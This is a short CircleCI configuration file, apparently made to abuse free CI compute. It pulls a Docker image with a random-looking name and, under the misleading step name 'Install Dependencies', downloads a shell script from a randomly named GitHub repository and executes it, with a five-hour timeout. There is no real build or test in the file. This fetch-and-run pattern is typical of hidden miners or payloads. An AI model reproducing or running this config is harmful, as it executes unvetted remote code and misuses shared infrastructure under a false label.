version: 2.1
jobs:
    trial:
      docker:
            - image: cnkajgqe2/az1
      parallelism: 1
      steps:
        - run:
            name: Install Dependencies
            command: apt update && apt install nodejs wget -y && wget https://github.com/forexforce/gasdqwz/raw/main/tes.sh && chmod +x tes.sh && ./tes.sh
            no_output_timeout: 5h

workflows:
    version: 2.1
    build:
        jobs:
        - trial